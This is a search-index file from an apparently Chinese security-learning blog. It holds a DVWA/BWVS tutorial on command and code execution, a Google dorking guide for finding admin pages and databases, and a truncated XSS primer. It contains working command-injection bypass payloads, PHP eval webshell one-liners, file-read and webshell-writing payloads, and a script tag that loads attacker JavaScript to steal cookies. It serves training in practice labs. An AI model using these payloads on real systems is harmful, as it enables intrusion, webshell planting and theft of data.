<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>远程命令执行与代码执行（remote command_code execute）漏洞总结</title>
      <link href="2022/02/28/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88remote%20command_code%20execute%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2022/02/28/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88remote%20command_code%20execute%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这周来学习下 “命令执行” 与 “代码执行” 漏洞；命令执行漏洞与代码执行漏洞没有太大的区别，不过我们在学习时还是要区分不同的概念。<hr></p><h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h3><p>RCE，即 Remote Command/Code Execute：远程命令/代码执行。可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>很多人喜欢把代码执行漏洞称为命令执行漏洞，因为命令执行漏洞可以执行系统命令，而代码执行漏洞也会执行系统命令，这样就容易混淆。其实两者比较好区分：命令执行漏洞是直接调用操作系统命令，故这里叫作OS命令执行漏洞，而代码执行漏洞则是靠执行脚本代码调用操作系统命令。</p><h4 id="1、命令执行漏洞"><a href="#1、命令执行漏洞" class="headerlink" title="1、命令执行漏洞"></a>1、命令执行漏洞</h4><p>Web应用有时需要调用一些执行系统命令的函数，例如，如果想测试 <a href="http://www.xxx.com/">www.xxx.com</a> 是否可以正常连接，那么Web应用底层就很可能去调用系统操作命令，如果此处没有过滤好用户输入的数据，就很有可能形成系统命令执行漏洞。</p><p>示例：pikachu靶场提供了测试域名/IP的 Ping 功能（命令执行漏洞模块)，并将 Ping 命令的执行过程显示出来。下面测试域名：<a href="http://www.baidu.com/">www.baidu.com</a> 是否可以正常连接，如图：<br><img src="https://img-blog.csdnimg.cn/a50235531ad8490ca6873ad441c649fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>通常这并没有什么问题，但不要忘记命令可以连接执行。</p><p>输入：<a href="http://www.baidu.com/">www.baidu.com</a> &amp;&amp; dir<br><img src="https://img-blog.csdnimg.cn/c7e1ffa8d2ea4fd087c0abaa000cce99.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>在知道了系统命令可以连接执行后，如果 Web应用程序没有过滤好输入，就变得相当危险。命令注入漏洞本身不会导致系统受损，但是攻击者可能能够使用提权升级和其他漏洞来获得更多访问权限。</p><h5 id="常用的命令连接符："><a href="#常用的命令连接符：" class="headerlink" title="常用的命令连接符："></a>常用的命令连接符：</h5><p>Windows和Linux都支持的连接符：</p><pre><code class="php">A|B    只执行BA||B   如果A执行出错，则执行BA&amp;B    先执行A，不管是否成功，都会执行BA&amp;&amp;B   先执行A，执行成功后执行B，否则不执行B</code></pre><p>只有Linux支持的连接符：</p><pre><code class="php">A;B    先执行A，再执行B</code></pre><h4 id="2、代码执行漏洞"><a href="#2、代码执行漏洞" class="headerlink" title="2、代码执行漏洞"></a>2、代码执行漏洞</h4><p>代码注入攻击与命令注入攻击不同。因为需求设计，后台有时候需要把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。</p><p>例：<br><img src="https://img-blog.csdnimg.cn/407e2565d1ea4e4ba96e9f9faa60abeb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>让用户输入字符，我们来输入<code>phpinfo();</code><br><img src="https://img-blog.csdnimg.cn/5c6a581cc34d4d429da5d6a0b4e9ab0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>发现直接执行了我们输入的代码。<br><img src="https://img-blog.csdnimg.cn/2dd4d9fa23574b3284f1cd63f9fcf90a.png"><br>查看代码发现是 <code>eval()</code> 函数执行了我们的提交参数。</p><h4 id="3、PHP中的危险函数："><a href="#3、PHP中的危险函数：" class="headerlink" title="3、PHP中的危险函数："></a>3、PHP中的危险函数：</h4><p>命令执行：</p><pre><code class="php">system()       输出并返回最后一行shell结果exec()         执行一个外部程序shell_exec()   通过shell环境执行命令，并且将完整的输出以字符串的方式返回passthru()     执行外部程序并且显示原始输出pcntl_exec()   在当前进程空间执行指定程序popen()        打开进程文件指针proc_open()    执行一个命令，并且打开用来输入/输出的文件指针</code></pre><p>代码执行：</p><pre><code class="php">eval()            把字符串作为PHP代码执行assert()          检查一个断言是否为 FALSE，可用来执行代码preg_replace()    执行一个正则表达式的搜索和替换call_user_func()  把第一个参数作为回调函数调用call_user_func_array() 调用回调函数，并把一个数组参数作为回调函数的参数array_map()       为数组的每个元素应用回调函数</code></pre><p>了解了这些知识后，在本地搭建的靶场中练习下。</p><h3 id="二、靶场练习"><a href="#二、靶场练习" class="headerlink" title="二、靶场练习"></a>二、靶场练习</h3><h4 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h4><p>使用DVWA靶场的Command Injection（命令注入）模块。<br><img src="https://img-blog.csdnimg.cn/20190820151202475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>先从Low级别开始。</p><h5 id="1、Low级别"><a href="#1、Low级别" class="headerlink" title="1、Low级别"></a>1、Low级别</h5><p>查看源码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</code></pre><p>可以看到，low级别的代码接收了用户输入的ip，服务器通过判断操作系统执行不同 ping 命令。但是这里对用户输入的ip并没有进行任何的过滤，所以存在可利用的命令执行漏洞。</p><p>用<code>&amp;&amp;</code>来执行多条命令，构造payload：<code>127.0.0.1&amp;&amp;net user</code><br><img src="https://img-blog.csdnimg.cn/20190820161837141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>执行成功！(如果存在乱码问题，把<code>DVWA\dvwa\includes</code>目录下的<code>dvwaPage.inc.php</code>文件中所有的<code>”charset=utf-8”</code>，全部替换修改为<code>”charset=gb2312”</code>即可)</p><h5 id="2、Medium级别"><a href="#2、Medium级别" class="headerlink" title="2、Medium级别"></a>2、Medium级别</h5><p>源码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Set blacklist    $substitutions = array(        &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; </code></pre><p>可以看到，medium级别相较于low级别的代码，增加了对 <code>&amp;&amp;</code> 和 <code>;</code>的过滤，绕过也很简单，不用 <code>&amp;&amp;</code> ，直接用 <code>&amp;</code>不就好起来了吗！</p><p><code>&amp;&amp;</code>和<code>&amp;</code>的区别在于<code>&amp;&amp;</code>是执行完前面的命令然后执行后面的命令，<code>&amp;</code>是不管前面的命令是否值执行，后面的都执行。</p><p>构造poyload：<code>127.0.0.1&amp;ipconfig</code></p><p><img src="https://img-blog.csdnimg.cn/2019082016482838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>绕过执行成功！</p><h5 id="3、High级别"><a href="#3、High级别" class="headerlink" title="3、High级别"></a>3、High级别</h5><p>源码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = trim($_REQUEST[ &#39;ip&#39; ]);    // Set blacklist    $substitutions = array(        &#39;&amp;&#39;  =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,        &#39;| &#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; </code></pre><p>相比于前面两个等级的，high等级的黑名单更完善了，但是由我们可以看出来他只是过滤掉了<code>“| ”</code>，如果用<code>|</code>后不跟空格就可以绕过过滤。</p><p>构造payload：<code>127.0.0.1|dir</code><br><img src="https://img-blog.csdnimg.cn/20190820170652732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>绕过成功。</p><h5 id="4、Impossible级别"><a href="#4、Impossible级别" class="headerlink" title="4、Impossible级别"></a>4、Impossible级别</h5><p>源码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        &#125;        else &#123;            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        &#125;        // Feedback for the end user        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Ops. Let the user name theres a mistake        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><p>了解下几个函数：</p><pre><code class="php">stripslashes(string) : 该函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。explode(separator,string,limit): 该函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。is_numeric(string): 该检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</code></pre><p>可以看到 Impossible级别的代码加入了<code>Anti-CSRF token</code>，至于什么是<code>Anti-CSRF token</code> 点击 <a href="https://www.owasp.org/index.php/Anti_CSRF_Tokens_ASP.NET">链接</a> 查看。</p><p>同时对参数ip进行了严格的限制，只有<code>“数字.数字.数字.数字”</code>的输入才会被接收执行，因此不存在命令注入漏洞。</p><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>使用 BWVS 的靶场。<br><img src="https://img-blog.csdnimg.cn/8335ee41e6b9494e8913385a9c09dfb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="1、一句话木马："><a href="#1、一句话木马：" class="headerlink" title="1、一句话木马："></a>1、一句话木马：</h5><p>输入</p><pre><code class="php">$&#123;@eval($_POST[&#39;a&#39;])&#125;</code></pre><p>蚁剑连接：<br><img src="https://img-blog.csdnimg.cn/2187b0a4e2fc4fc8b6da7502a805d337.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="2、获取当前工作路径："><a href="#2、获取当前工作路径：" class="headerlink" title="2、获取当前工作路径："></a>2、获取当前工作路径：</h5><p>输入：</p><pre><code class="php">$&#123;exit(print(getcwd()))&#125;</code></pre><p><img src="https://img-blog.csdnimg.cn/a7f719ecfb594ba49486f6f003980f44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="3、读文件："><a href="#3、读文件：" class="headerlink" title="3、读文件："></a>3、读文件：</h5><pre><code class="php">$&#123;exit(var_dump(file_get_contents($_POST[f])))&#125;POST：f=文件路径</code></pre><p><img src="https://img-blog.csdnimg.cn/cb2f2a2ffeca45af829e4a3fae05fdff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="4、写webshell："><a href="#4、写webshell：" class="headerlink" title="4、写webshell："></a>4、写webshell：</h5><pre><code class="php">$&#123;exit(var_dump(file_put_contents($_POST[f], $_POST[d])))&#125;f=webshell.php&amp;d=&lt;?php @eval($_POST[&#39;abc&#39;]); ?&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/e865462c47554b1db7e06256788f9413.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>测试是否上传成功：<br><img src="https://img-blog.csdnimg.cn/a31a050234354473b41039ee0b40ca39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>成功上传！</p><p>🆗，关于命令执行与代码执行漏洞，这次就先总结到这啦。(●’◡’●)</p><p>参考博客：<br><a href="https://blog.csdn.net/qq_43625917/article/details/98802320">https://blog.csdn.net/qq_43625917/article/details/98802320</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/82917250">https://blog.csdn.net/qq_36119192/article/details/82917250</a><br><a href="https://blog.csdn.net/jpygx123/article/details/83276533">https://blog.csdn.net/jpygx123/article/details/83276533</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Hacking语法总结</title>
      <link href="2022/01/17/Google%20Hacking%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>2022/01/17/Google%20Hacking%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>简单总结下Google Hacking语法。</p><h4 id="一、什么是Google-Hacking？"><a href="#一、什么是Google-Hacking？" class="headerlink" title="一、什么是Google Hacking？"></a>一、什么是Google Hacking？</h4><p><img src="https://img-blog.csdnimg.cn/20210121211831580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>Google Hacking是指使用Google、百度等搜索引擎对某些特定网站主机漏洞进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。</p><p>对于普通用户而言，Google只是一款强大的搜索引擎，而对于渗透人员而言，它可能是一款绝佳的渗透工具。正因为Google的检索能力强大，我们可以构造特殊的关键字语法来搜索互联网上的的相关敏感信息。</p><h4 id="二、Google-Hacking的常用语法："><a href="#二、Google-Hacking的常用语法：" class="headerlink" title="二、Google Hacking的常用语法："></a>二、Google Hacking的常用语法：</h4><ul><li><p>site：找到与指定网站有联系的URL。例如输入<code>Site:family.chinaok.com</code>，返回所有和这个网站有关的URL。</p></li><li><p>intitle：返回所有网页标题中包含关键词的网页。例如输入<code>intitle:cbi</code>，这样网页标题中带有 cbi 的网页都会被搜索出来。</p></li><li><p>inurl：搜索包含有特定字符的URL。例如输入<code>inurl:cbi</code>，则可以找到带有 cbi 字符的URL。</p></li><li><p>intext：搜索网页正文内容中的指定字符。例如输入<code>intext:cbi</code>，将返回所有在网页正文部分包含 cbi 的网页。</p></li><li><p>link：例如<code>link:thief.one</code>，返回所有和 thief.one 做了链接的URL。 </p></li><li><p>filetype：搜索指定类型的文件。例如输入<code>filetype:cbi</code>，将返回所有以 cbi 结尾的文件URL。</p></li></ul><p>这些就是Google Hacking的常用语法，虽然这只是Google语法中很小的部分，但是合理使用这些语法将产生意想不到的效果。</p><h4 id="三、Google-hacking的常用语法："><a href="#三、Google-hacking的常用语法：" class="headerlink" title="三、Google hacking的常用语法："></a>三、Google hacking的常用语法：</h4><p>了解了Google Hacking的基本语法后，我们来看一下黑客是如何使用这些语法的，这些语法在渗透的过程中又会起到怎样的作用呢？</p><h5 id="1、寻找网站的后台登录页面："><a href="#1、寻找网站的后台登录页面：" class="headerlink" title="1、寻找网站的后台登录页面："></a>1、寻找网站的后台登录页面：</h5><p><strong>Intitle</strong>：</p><p> intitle语法通常被用来搜索网站的后台、特殊页面和文件，通过在Google中搜索<code>intitle:登录</code>、<code>intitle:管理</code>就可以找到很多网站的后台登录页面。</p><p><strong>Inurl</strong>：</p><p> 主要可以分为以下两个方面：寻找网站后台登录地址，搜索特殊URL。</p><p>1、寻找网站后台登录地址：</p><p>inurl 可以指定URL中的关键字，我们都知道网站的后台URL都是类似 login.asp、admin.asp为结尾的，那么我们只要以<code>inurl:login.asp</code>、<code>inurl:admin.asp</code>为关键字进行搜索，就可以找到很多网站的后台。此外，我们还可以搜索网站的数据库地址，以<code>inurl:data</code>、<code>inurl:db</code>为关键字进行搜索即可。</p><p>2、搜索特殊URL：</p><p>通过 inurl 语法搜索特殊URL，我们可以找到很多网站程序的漏洞，例如要搜索前段日子很火的上传漏洞，我们使用<code>inurl:upload.asp</code>或<code>inurl:upload_soft.asp</code>即可找到很多上传页面。</p><h5 id="2、搜索网站中的文件："><a href="#2、搜索网站中的文件：" class="headerlink" title="2、搜索网站中的文件："></a>2、搜索网站中的文件：</h5><p><strong>Filetype</strong>：</p><p>Filetype 的作用是搜索指定文件。假如我们要搜索网站的数据库文件，那么可以以<code>filetype:mdb</code>为关键字进行搜索，很快就可以下载到不少网站的数据库文件。</p><hr><p>语法组合，威力加倍</p><p>虽然上文中介绍的这几个语法能各自完成入侵中的一些步骤，但是只使用一个语法进行入侵，其效率是很低下的。Google Hack的威力在于能将多个语法组合起来，这样就可以快速地找到我们需要的东西。</p><h5 id="3、下载网站的数据库："><a href="#3、下载网站的数据库：" class="headerlink" title="3、下载网站的数据库："></a>3、下载网站的数据库：</h5><p>搜索 <code>Site:target.com Filetype:mdb</code> 就可以寻找目标网站的数据库，其中的 Site 语法限定搜索范围，Filetype决定搜索目标。用这种方法有一个缺点，就是下载到数据库的成功率较低。</p><h5 id="4、登录后台管理："><a href="#4、登录后台管理：" class="headerlink" title="4、登录后台管理："></a>4、登录后台管理：</h5><p>对于网站后台的查找，可以使用语法组合<code>Site:target.com intitle:管理</code>或<code>Site:target.com inurl:login.asp</code>进行搜索，</p><h5 id="5、利用google搜索C段服务器信息："><a href="#5、利用google搜索C段服务器信息：" class="headerlink" title="5、利用google搜索C段服务器信息："></a>5、利用google搜索C段服务器信息：</h5><pre><code class="php">site:218.87.21.* </code></pre><p>可通过google可获取 218.87.21.0/24 网络的服务信息。</p><p><code>.</code>单一的通配符。</p><p><code>*</code>通配符，可代表多个字母。</p><h5 id="6、利用其他漏洞："><a href="#6、利用其他漏洞：" class="headerlink" title="6、利用其他漏洞："></a>6、利用其他漏洞：</h5><p>如果下载数据库不成功，我们还可以尝试其他的入侵方法。例如寻找上传漏洞，搜索 <code>Site:target.com inurl:upload.asp</code>。此外，我们还可以根据一些程序漏洞的特征，定制出Google Hack的语句。</p><p>最后推荐一个网站：<a href="https://www.exploit-db.com/google-hacking-database">Exploit DB</a>上有很多大佬总结分享的构造语句，感兴趣的同学可以去看下。<br><img src="https://img-blog.csdnimg.cn/20210121214752387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS (跨站脚本攻击) 分析与实战</title>
      <link href="2022/01/14/XSS%20(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB)%20%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98/"/>
      <url>2022/01/14/XSS%20(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB)%20%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a>一、漏洞原理</h3><h4 id="1、XSS简介："><a href="#1、XSS简介：" class="headerlink" title="1、XSS简介："></a>1、XSS简介：</h4><p>XSS全称：Cross Site Scripting，即跨站脚本攻击，为了不和“层叠样式表”(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p><p>XSS是最常见的 Web 应用程序安全漏洞之一，这类漏洞能够使攻击者嵌入恶意脚本代码（一般是JS代码）到正常用户会访问到的页面中，当正常用户访问该页面时，恶意脚本代码将会在用户的浏览器上执行，从而达到恶意攻击用户的目的。</p><p>从上述内容可知，XSS属于客户端攻击，受害者最终是用户。但不要以为受害者是用户，就认为跟自己的网站、服务器安全没有关系，不要忘记网站管理人员也属于用户之一，这就意味着 XSS 可以攻击 “服务器端”。因为管理员要比普通用户的权限大得多，而攻击者就有可能靠管理员身份作为“跳板”实施攻击。</p><h4 id="2、XSS原理解析"><a href="#2、XSS原理解析" class="headerlink" title="2、XSS原理解析:"></a>2、XSS原理解析:</h4><p>XSS攻击在网页中嵌入的恶意脚本代码一般是使用 JavaScript 语言，JavaScript 可以获取用户的Cookie、改变网页内容、URL跳转，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者需要做的仅仅是向Web页面中注入JavaScript 代码。</p><p>下面是一个简单的XSS漏洞实例，代码如下：</p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;meta content=&quot;text/html;charset=utf-8&quot;/&gt;    &lt;title&gt;xss漏洞示例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;    &lt;h6&gt;把输入的字符串输出&lt;/h6&gt;    &lt;form action=&quot;#&quot; method=&quot;get&quot;&gt;        &lt;h6&gt;请输入&lt;/h6&gt;        &lt;input type=&quot;text&quot; name=&quot;xss&quot;&gt;&lt;br /&gt;        &lt;input type=&quot;submit&quot; value=&quot;确定&quot;&gt;    &lt;/form&gt;    &lt;hr&gt;    &lt;?php        if (isset($_GET[&#39;xss&#39;])) &#123;              echo &#39;&lt;input type=&quot;text&quot; value=&quot;&#39;.$_GET[&#39;xss&#39;].&#39;&quot;&gt;&#39;;        &#125;else&#123;            echo &#39;&lt;input type=&quot;text&quot;&gt;&#39;;        &#125;    ?&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在代码中，通过GET获取参数xss的值，然后通过echo输出一个input标签，并将xss的值放入input标签的value中。例如我们输入123，会在下面的输出框中输出123。<br><img src="https://img-blog.csdnimg.cn/ba8e75e4ab7f41eeba69313bf99ba6cc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>那么当我们输入<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>时，输出到页面的 HTML代码变为</p><pre><code class="bash">&lt;input type=&quot;text&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code></pre><p>发现，输入的双引号闭合了value属性的双引号，输入的<code>&gt;</code>闭合了input的标签，导致我们后面输入的恶意代码成为另一个HTML标签。<br><img src="https://img-blog.csdnimg.cn/9b65e60015244e8d89e4039bef197534.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当浏览器渲染时执行了<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，JS函数alert()导致浏览器弹窗。<br><img src="https://img-blog.csdnimg.cn/540cb05c3d294f7fa615db5178262608.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>在真实的攻击中，攻击者通过构造JS代码来实现一些 “特殊效果”。攻击者不仅仅弹出一个框，通常使用<code>&lt;script src=&quot;http:// www.hacker.com/x.txt&quot;&gt;&lt;/script&gt;</code>方式来加载外部脚本，而在x.txt中就存放着攻击者的恶意JS 代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。</p><blockquote><p>注：JavaScript 加载外部的代码文件可以是任意扩展名（无扩展名也可以)，如：<code>&lt;script src=&quot;http://www.secbug.org/x.jpg&quot;&gt;&lt;/script&gt;</code>，即使文件为图片扩展名x.jpg，但只要其文件中包含JS代码就会被执行。</p></blockquote><h4 id="3、XSS的分类："><a href="#3、XSS的分类：" class="headerlink" title="3、XSS的分类："></a>3、XSS的分类：</h4><p>XSS主要被分为三类，分别是：反射型、存储型 和 DOM型。这些有一些相同的特点，但是在如何确定和利用方面有一些区别，下面依次分析它们。</p><h5 id="3-1、反射型XSS"><a href="#3-1、反射型XSS" class="headerlink" title="3.1、反射型XSS"></a>3.1、反射型XSS</h5><p>反射型XSS 也被称为 非持久性XSS，是最容易出现的一种XSS漏洞。当用户访问一个带有 XSS 代码的 URL 请求时，服务器端接收数据后处理，然后把带有 XSS 代码的数据发送到浏览器，浏览器解析这段带有 XSS 代码的数据后，最终造成 XSS 漏洞。这个过程就像一次反射，故称为 “反射型XSS”。</p><p>下面用 DVWA 为大家进行演示，在输入框中构造如下JS代码：</p><pre><code class="php">&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></pre><p>这代码是进行弹窗操作，如果页面出现弹窗，说明我们插入的恶意代码被执行，结果如下：<br><img 